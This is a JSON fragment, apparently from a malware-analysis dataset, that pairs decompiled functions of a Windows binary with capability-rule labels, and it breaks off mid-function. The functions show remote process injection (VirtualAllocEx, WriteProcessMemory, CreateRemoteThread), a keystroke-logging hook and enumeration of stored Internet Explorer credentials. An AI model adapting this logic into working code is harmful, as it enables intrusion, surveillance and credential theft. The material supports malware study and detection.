        "decompiled_code": "\nint32_t __cdecl fcn.004076ba(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_4ch;\n    uint hThread;\n    uint var_24h;\n    uint var_20h;\n    uint hMutex;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uint32_t var_8h;\n    \n    var_ch = in_ECX;\n    fcn.0041178e();\n    var_8h = 0;\n    if (in_ECX[2] != 0) {\n        var_10h = 0;\n        do {\n            iVar5 = var_10h;\n            fcn.00405de9();\n            uVar2 = var_8h;\n            var_14h = var_8h + 1;\n            if (*(*in_ECX + iVar5 + 4) == arg_ch) {\n                fcn.00405de9();\n                fcn.00405feb();\n                piVar1 = var_ch;\n                fcn.00405de9();\n                iVar5 = (*_sym.imp.KERNEL32.dll_TerminateThread)(*(*piVar1 + uVar2 * 0xc), 0);\n                var_10h = iVar5;\n                fcn.00405de9();\n                uVar2 = var_ch[2];\n                if (var_14h <= uVar2) {\n                    iVar4 = var_14h * 0xc;\n                    uVar3 = var_14h;\n                    do {\n                        puVar6 = *var_ch + iVar4;\n                        uVar3 = uVar3 + 1;\n                        iVar4 = iVar4 + 0xc;\n                        puVar6[-3] = *puVar6;\n                        puVar6[-2] = puVar6[1];\n                        puVar6[-1] = puVar6[2];\n                        uVar2 = var_ch[2];\n                        iVar5 = var_10h;\n                    } while (uVar3 <= uVar2);\n                }\n                var_ch[2] = uVar2 - 1;\n                if (arg_10h != 0) {\n                    var_18h = 0;\n                    var_14h = 0;\n                    arg_8h_00 = fcn.004041b7(arg_ch, 0, 0, 0, 0, 0, &var_18h, 3);\n                    fcn.00405044(arg_8h_00);\n                    fcn.0040411d();\n                    fcn.00403148();\n                }\n                goto code_r0x00407720;\n            }\n            var_10h = var_10h + 0xc;\n            var_8h = var_14h;\n        } while (var_14h < in_ECX[2]);\n    }\n    iVar5 = 0;\ncode_r0x00407720:\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[4]);\n    return iVar5;\n}\n",
        "token_count": 740
    },
    "00407929": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407929(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 != 0) {\n        fcn.00411644();\n    }\n    fcn.0041140c();\n    if (param_1[1] != 0) {\n        for (iVar1 = *(param_1[1] + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00403148();\n        }\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 153
    },
    "00407981": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407981(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t dwMoveMethod;\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t nNumberOfBytesToRead;\n    \n    if ((*in_ECX == 0) || (in_ECX[0xc] <= arg_8h && arg_8h != in_ECX[0xc])) {\n        uVar1 = 0;\n    }\n    else {\n        dwMoveMethod = in_ECX[0xb] * arg_8h;\n        nNumberOfBytesToRead = in_ECX[10] - dwMoveMethod;\n        if (nNumberOfBytesToRead < in_ECX[0xb]) {\n            uVar1 = fcn.0041135c(arg_ch, nNumberOfBytesToRead, dwMoveMethod);\n            arg_8h_00 = fcn.00401085(in_ECX[0xb] - nNumberOfBytesToRead);\n            fcn.004030cc(arg_8h_00, in_ECX[0xb] - nNumberOfBytesToRead);\n            fcn.00401099(arg_8h_00);\n        }\n        else {\n            uVar1 = fcn.0041135c(arg_ch, in_ECX[0xb], dwMoveMethod);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 307
    },
    "00407b2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407b2e(uint noname_0, uint noname_1, uint dwProcessId)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint *arg_14h;\n    uint lpflOldProtect;\n    int32_t lpBaseAddress;\n    uint var_ch;\n    int32_t lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    if (*0x426754 == '\\0') {\n        iVar2 = fcn.0040fb98();\n        *0x426754 = iVar2 != 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, dwProcessId);\n    if (iVar2 == 0) {\n        return 0xffffffff;\n    }\n    lpNumberOfBytesWritten = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar3 = fcn.004121dc();\n    if ((iVar3 == 0) || (lpNumberOfBytesWritten = iVar2,  iVar3 = fcn.004121dc(),  iVar3 != 0)) {\n        pcVar1 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar2, 0, 0x100000, 0x3000, 0x40);\n        if (iVar3 != 0) {\n            lpflOldProtect = 0;\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(iVar2, iVar3, 0x100000, 0x40, &lpflOldProtect);\n            lpBaseAddress = (*pcVar1)(iVar2, 0x33370000, 0x100, 0x3000, 0x40);\n            if (lpBaseAddress != 0) {\n                var_4h = 0;\n                uVar5 = fcn.00401133(\"XXXXXX\", &var_4h);\n                iVar6 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar2, lpBaseAddress, \"XXXXXX\", uVar5);\n                if (iVar6 == 0) {\n                    return 0xfffffffd;\n                }\n                iVar6 = fcn.00401133(\"XXXXXX\");\n                if (var_4h != iVar6) {\n                    return 0xfffffffd;\n                }\n                lpNumberOfBytesWritten = 0;\n                iVar6 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                  (iVar2, iVar3, 0x41e6c0, 0x1d44, &lpNumberOfBytesWritten);\n                if (iVar6 == 0) {\n                    return 0xfffffffd;\n                }\n                if (lpNumberOfBytesWritten != 0x1d44) {\n                    return 0xfffffffd;\n                }\n                uVar5 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(iVar2, 0, 0, iVar3, 0, 0, 0);\n                return uVar5;\n            }\n        }\n    }\n    else {\n        iVar7 = fcn.0040fbb4(0, 0);\n        uVar5 = iVar7 >> 0x20;\n        lpflOldProtect = iVar7;\n        if (iVar7 != 0) {\n            lpNumberOfBytesWritten = 0;\n            fcn.0040fd0d(lpflOldProtect, uVar5, &lpNumberOfBytesWritten, &lpNumberOfBytesWritten);\n            _lpBaseAddress = fcn.0040fbb4(0x33370000, 0);\n            if (_lpBaseAddress != 0) {\n                arg_14h = &var_4h;\n                var_4h = 0;\n                uVar4 = fcn.00401133(\"XXXXXX\");\n                iVar3 = fcn.0040fae9(lpBaseAddress, var_ch, uVar4, arg_14h);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.00401133(\"XXXXXX\");\n                    uVar4 = lpflOldProtect;\n                    if (var_4h == iVar3) {\n                        var_4h = 0;\n                        iVar3 = fcn.0040fae9(lpflOldProtect, uVar5, 0x2412, &var_4h);\n                        if ((iVar3 != 0) && (var_4h == 0x2412)) {\n                            (*_sym.imp.USER32.dll_MessageBoxA)(0, \"Injecting64\", \"Debug\", 0);\n                            uVar5 = fcn.0040fc62(iVar2, iVar2 >> 0x1f, uVar4, uVar5);\n                            return uVar5;\n                        }\n                    }\n                }\n                return 0xfffffffd;\n            }\n        }\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 1103
    },
    "00407d5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407d5e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint lpBuffer;\n    uint lpBaseAddress;\n    uint lpflOldProtect;\n    int32_t lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    if (*0x426754 == '\\0') {\n        iVar1 = fcn.0040fb98();\n        *0x426754 = iVar1 != 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar1, 0, 0x100000, 0x3000, 0x40);\n        if (iVar3 != 0) {\n            lpflOldProtect = 0;\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(iVar1, iVar3, 0x100000, 0x40, &lpflOldProtect);\n            iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar1, 0x33370000, 0x100, 0x3000, 0x40);\n            if (iVar4 != 0) {\n                var_4h = 0;\n                uVar2 = fcn.00401133(\"XXXXXX\", &var_4h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar1, iVar4, \"XXXXXX\", uVar2);\n                if ((iVar4 != 0) && (iVar4 = fcn.00401133(\"XXXXXX\"),  var_4h == iVar4)) {\n                    lpNumberOfBytesWritten = 0;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar1, iVar3, in_ECX);\n                    if ((iVar4 != 0) && (lpNumberOfBytesWritten == in_EDX)) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(iVar1, 0, 0, iVar3, 0, 0, 0);\n                        return uVar2;\n                    }\n                }\n                return 0xfffffffd;\n            }\n        }\n        uVar2 = 0xfffffffe;\n    }\n    return uVar2;\n}\n",
        "token_count": 566
    },
    "00407e67": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407e67(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_10h;\n    int32_t iVar3;\n    uint noname_2;\n    int32_t in_EDX;\n    uint arg_ch;\n    int64_t iVar4;\n    uint *arg_14h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*0x426754 == '\\0') {\n        iVar1 = fcn.0040fb98();\n        *0x426754 = iVar1 != 0;\n    }\n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        iVar1 = fcn.00407a8e();\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, iVar1);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar4 = fcn.0040fbb4(0, 0);\n        arg_ch = iVar4 >> 0x20;\n        uVar2 = iVar4;\n        if (iVar4 != 0) {\n            var_8h = 0;\n            fcn.0040fd0d(uVar2, arg_ch, noname_2, &var_8h);\n            iVar4 = fcn.0040fbb4(0x33370000, 0);\n            if (iVar4 != 0) {\n                arg_8h = 0;\n                arg_14h = &arg_8h;\n                arg_10h = fcn.00401133(\"XXXXXX\");\n                iVar3 = fcn.0040fae9(iVar4, iVar4 >> 0x20, arg_10h, arg_14h);\n                if ((iVar3 != 0) && (iVar3 = fcn.00401133(\"XXXXXX\"),  arg_8h == iVar3)) {\n                    arg_8h = 0;\n                    iVar3 = fcn.0040fae9(uVar2, arg_ch, var_4h, &arg_8h);\n                    if ((iVar3 != 0) && (arg_8h == var_4h)) {\n                        uVar2 = fcn.0040fc62(iVar1, iVar1 >> 0x1f, uVar2, arg_ch);\n                        return uVar2;\n                    }\n                }\n                return 0xfffffffd;\n            }\n        }\n        uVar2 = 0xfffffffe;\n    }\n    return uVar2;\n}\n",
        "token_count": 608
    },
    "0040813a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040813a(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int16_t iVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint lpString;\n    uint ARG_0;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    if ((in_EDX != 0x100) && (in_EDX != 0x104)) goto code_r0x00408570;\n    uVar1 = *arg_8h;\n    if (uVar1 < 0x27) {\n        if (0x40 < uVar1) goto code_r0x00408218;\ncode_r0x00408264:\n        if (uVar1 < 0x67) {\n            if (uVar1 != 0x66) {\n                if (uVar1 < 0x21) {\n                    if (uVar1 != 0x20) {\n                        if (uVar1 < 0x12) {\n                            if (((uVar1 != 0x11) && (uVar1 != 8)) && ((uVar1 != 9 && (uVar1 != 0xd)))) {\n                                if (uVar1 == 0x10) goto code_r0x00408570;\n                                goto code_r0x00408507;\n                            }\n                        }\n                        else if (((uVar1 != 0x12) && (uVar1 != 0x14)) && (uVar1 != 0x1b)) goto code_r0x00408507;\n                    }\n                }\n                else if (uVar1 < 99) {\n                    if (((uVar1 != 0x62) && (uVar1 != 0x2d)) &&\n                       ((uVar1 != 0x2e && ((uVar1 != 0x60 && (uVar1 != 0x61)))))) {\ncode_r0x00408507:\n                        (*_sym.imp.USER32.dll_GetKeyNameTextW)\n                                  ((arg_8h[2] * 0x100 + arg_8h[1]) * 0x10000 + 1, &lpString, 0xf);\n                    }\n                }\n                else if (((uVar1 != 99) && (uVar1 != 100)) && (uVar1 != 0x65)) goto code_r0x00408507;\n            }\n        }\n        else if (uVar1 < 0xbd) {\n            if (uVar1 == 0xbc) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 < 0xa4) {\n                if ((((uVar1 < 0xa2) && (uVar1 != 0x67)) && (uVar1 != 0x68)) && (uVar1 != 0x69)) {\n                    if (uVar1 - 0xa0 < 2) goto code_r0x00408570;\n                    goto code_r0x00408507;\n                }\n            }\n            else if (0xa5 < uVar1) {\n                if (uVar1 == 0xba) {\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n                else {\n                    if (uVar1 != 0xbb) goto code_r0x00408507;\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n            }\n        }\n        else if (uVar1 < 0xdc) {\n            if (uVar1 == 0xdb) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbd) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbe) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbf) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else {\n                if (uVar1 != 0xc0) goto code_r0x00408507;\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n        }\n        else if (uVar1 == 0xdc) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else if (uVar1 == 0xdd) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else {\n            if (uVar1 != 0xde) goto code_r0x00408507;\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n    }\n    else {\n        if (0x40 < uVar1) {\ncode_r0x00408218:\n            if (uVar1 < 0x5b) {\n                var_4h = in_ECX;\n                fcn.004085c0();\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                cVar2 = fcn.004085ae();\n                uVar4 = uVar1 + 0x20;\n                if (cVar2 != '\\0') {\n                    uVar4 = uVar1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x417aa8, uVar4);\n                fcn.004085cb();\n                in_ECX = var_4h;\n                goto code_r0x00408570;\n            }\n            goto code_r0x00408264;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        if (iVar3 == 0) {\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x417aa8, uVar1);\n        }\n        else {\n            if (9 < uVar1 - 0x30) goto code_r0x00408570;\n    // switch table (10 cases) at 0x408586\n            switch(*((uVar1 - 0x30) * 4 + 0x408586)) {\n            case 0x408194:\n                break;\n            case 0x40819e:\n                break;\n            case 0x4081a8:\n                break;\n            case 0x4081b2:\n                break;\n            case 0x4081bc:\n                break;\n            case 0x4081c6:\n                break;\n            case 0x4081d0:\n                break;\n            case 0x4081da:\n                break;\n            case 0x4081e4:\n                break;\n            case 0x4081ee:\n            }\n        }\n    }\n    fcn.004085cb();\ncode_r0x00408570:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(0, in_ECX, var_8h, arg_8h);\n    return;\n}\n",
        "token_count": 1572
    },
    "00408b2d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpKeyState\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.00408b2d(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint pwszBuff;\n    uint lpKeyState;\n    \n    fcn.00401052(&pwszBuff, 0, 0x100);\n    uVar2 = param_1;\n    uVar1 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar2, 0);\n    if (uVar2 < 0x5d) {\n        if (uVar2 < 0x5b) {\n            if (uVar2 < 0x15) {\n                if (uVar2 != 0x14) {\n                    if (uVar2 < 8) goto code_r0x00408be7;\n                    if ((9 < uVar2) && (uVar2 != 0xd)) {\n                        if (uVar2 < 0x10) goto code_r0x00408be7;\n                        bVar3 = uVar2 < 0x12;\n                        bVar4 = uVar2 == 0x12;\n                        goto code_r0x00408b87;\n                    }\n                }\n            }\n            else if ((uVar2 < 0x20) || ((0x28 < uVar2 && (uVar2 != 0x2e)))) goto code_r0x00408be7;\n        }\n    }\n    else if (uVar2 < 0xb4) {\n        if (uVar2 < 0xb2) {\n            if (uVar2 < 0x60) goto code_r0x00408be7;\n            if (0x69 < uVar2) {\n                if (uVar2 < 0xad) goto code_r0x00408be7;\n                bVar3 = uVar2 < 0xaf;\n                bVar4 = uVar2 == 0xaf;\ncode_r0x00408b87:\n                if (!bVar3 && !bVar4) goto code_r0x00408be7;\n            }\n        }\n    }\n    else if ((uVar2 < 0xba) || ((0xc0 < uVar2 && (3 < uVar2 - 0xdb)))) goto code_r0x00408be7;\n    uVar1 = uVar1 | 0x100;\ncode_r0x00408be7:\n    lpKeyState._0_1_ = (*_sym.imp.USER32.dll_GetKeyState)(uVar2);\n    (*_sym.imp.USER32.dll_ToUnicode)(uVar2, uVar1, &lpKeyState, &pwszBuff, 1, 0);\n    return &pwszBuff;\n}\n",
        "token_count": 632
    },
    "00409029": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00409029(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x55a808);\n    if (*0x559de0 != 0) {\n        fcn.00401f98();\n        *0x559de0 = 0;\n        fcn.00401f6d(fcn.00407f94, 0x559de0);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x55a808);\n    return;\n}\n",
        "token_count": 111
    },
    "0040906f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040906f(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar2 = &lpCriticalSection;\n    puVar3 = 0x55a808;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x55a808);\n    *0x55a830 = arg_8h;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    *0x42675c = 0x559de0;\n    if (arg_ch == 0) {\n        fcn.00401f98();\n        *0x559de0 = 1;\n        fcn.00401f6d(fcn.00408d0f, 0x559de0);\n    }\n    else {\n        fcn.00401f6d(fcn.00407f94, 0x559de0);\n        *0x55a7f4 = 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x55a808);\n    return;\n}\n",
        "token_count": 351
    },
    "0040a968": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __fastcall fcn.0040a968(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint uStack88;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    var_ch = 0;\n    var_28h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    var_4h = 0;\n    var_50h = 0;\n    iVar1 = fcn.0040acbe();\n    if ((((iVar1 != 0) && (iVar1 = (**(param_1 + 0x8c))(0x41c150, 0, &var_ch),  iVar1 == 0)) &&\n        (iVar1 = (**(param_1 + 0x94))(var_ch, 0x200, &var_28h, &var_10h),  iVar1 == 0)) && (var_28h != 0)) {\n        var_4ch = 0;\n        var_24h = 0;\n        var_20h = 0;\n        do {\n            iVar1 = fcn.0040ac8b();\n            if (iVar1 == 0) {\n                var_18h = var_10h + var_24h;\n                iVar1 = fcn.00401000(iVar3, 0x41c140, 0x10);\n                if (iVar1 == 0) {\n                    fcn.004036f7(*(var_18h + 0x10));\n                    uVar2 = fcn.004036f7(L\"Internet Explorer\");\n                    iVar1 = fcn.0040335a(uVar2);\n                    fcn.00405feb();\n                    iVar3 = var_4h;\n                    var_3ch = 0;\n                    if (iVar1 != 0) {\n                        var_60h = *0x41a910;\n                        var_5ch = *0x41a914;\n                        var_58h = *0x41a918;\n                        uStack88 = *0x41a91c;\n                        uVar2 = fcn.004036f7(*(var_4h + 0x14) + 0x20);\n                        fcn.00403549(uVar2);\n                        fcn.00405feb();\n                        var_40h = 0;\n                        uVar2 = fcn.004036f7(*(iVar3 + 0x18) + 0x20);\n                        fcn.00403549(uVar2);\n                        fcn.00405feb();\n                        var_8h = 0;\n                        var_44h = 0;\n                        iVar3 = (**(param_1 + 0x98))\n                                          (var_ch, var_18h, *(var_18h + 0x14), *(var_18h + 0x18), 0, 0, 0, &var_8h);\n                        if (iVar3 == 0) {\n                            var_4h = var_8h;\n                            var_60h = *(var_18h + 0x1c) + 0x20;\n                            var_5ch = fcn.004036f7(var_60h);\n                            fcn.00403549(var_5ch);\n                            fcn.00405feb();\n                            var_48h = 0;\n                        }\n                        puVar4 = &var_60h;\n                        fcn.00401ff2(puVar4);\n                        fcn.00402028(puVar4);\n                        fcn.00401441();\n                    }\n                    fcn.00405feb();\n                    var_1ch = 0;\n                    iVar3 = var_4h;\n                }\n            }\n            else {\n                iVar3 = var_20h + var_10h;\n                var_4h = iVar3;\n                iVar1 = fcn.00401000(iVar3, 0x41c140, 0x10);\n                if (iVar1 == 0) {\n                    fcn.004036f7(*(iVar3 + 0x10));\n                    uVar2 = fcn.004036f7(L\"Internet Explorer\");\n                    iVar1 = fcn.0040335a(uVar2);\n                    fcn.00405feb();\n                    iVar3 = var_4h;\n                    var_2ch = 0;\n                    if (iVar1 != 0) {\n                        var_60h = *0x41a910;\n                        var_5ch = *0x41a914;\n                        var_58h = *0x41a918;\n                        uStack88 = *0x41a91c;\n                        uVar2 = fcn.004036f7(*(var_4h + 0x14) + 0x20);\n                        fcn.00403549(uVar2);\n                        fcn.00405feb();\n                        var_30h = 0;\n                        uVar2 = fcn.004036f7(*(iVar3 + 0x18) + 0x20);\n                        fcn.00403549(uVar2);\n                        fcn.00405feb();\n                        var_8h = 0;\n                        var_34h = 0;\n                        iVar3 = (**(param_1 + 0x98))(var_ch, iVar3, *(iVar3 + 0x14), *(iVar3 + 0x18), 0, 0, 0, &var_8h);\n                        if (iVar3 == 0) {\n                            var_4h = var_8h;\n                            var_60h = *(var_8h + 0x1c) + 0x20;\n                            var_5ch = fcn.004036f7(var_60h);\n                            fcn.00403549(var_5ch);\n                            fcn.00405feb();\n                            var_38h = 0;\n                        }\n                        puVar4 = &var_60h;\n                        fcn.00401ff2(puVar4);\n                        fcn.00402028(puVar4);\n                        fcn.00401441();\n                    }\n                    fcn.00405feb();\n                    var_14h = 0;\n                    iVar3 = var_4h;\n                }\n            }\n            var_20h = var_20h + 0x38;\n            var_4ch = var_4ch + 1;\n            var_24h = var_24h + 0x34;\n        } while (var_4ch < var_28h);\n    }\n    if (var_10h != 0) {\n        (**(param_1 + 0xa0))(var_10h);\n    }\n    if (var_ch != 0) {\n        (**(param_1 + 0x90))(&var_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(param_1 + 0xc0));\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 1748
    },
    "0040b165": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b165(uint arg_8h, char *pszPath)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint uVar7;\n    uint lpBuffer;\n    uint var_c28h;\n    uint var_a28h;\n    uint var_828h;\n    uint var_628h;\n    uint var_428h;\n    uint lpPathName;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    uVar7 = 0;\n    fcn.00401052(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    if ((pszPath == 0x1) &&\n       (((((*(in_ECX + 0xb8) == 0 || (*(in_ECX + 0xac) == 0)) || (*(in_ECX + 0xb0) == 0)) ||\n         ((*(in_ECX + 0xbc) == 0 || (*(in_ECX + 0xa4) == 0)))) || (*(in_ECX + 0xb4) == 0)))) {\n        fcn.00415847(&var_1ch, *(*0x426864 + 8), 5);\n        if (var_18h == 0) {\n            fcn.00403148();\n            goto code_r0x0040b86c;\n        }\n        fcn.00401052(&var_a28h, 0, 0x100);\n        fcn.00401052(&var_428h, 0, 0x100);\n        fcn.00401052(&var_828h, 0, 0x100);\n        fcn.00401052(&var_628h, 0, 0x100);\n        fcn.00401052(&var_c28h, 0, 0x100);\n        fcn.00401052(&lpPathName, 0, 0x100);\n        var_ch = fcn.00401085(0x519d0);\n        var_8h = fcn.00401085(0x217d0);\n        pszPath = fcn.00401085(0x6b738);\n        pcVar4 = 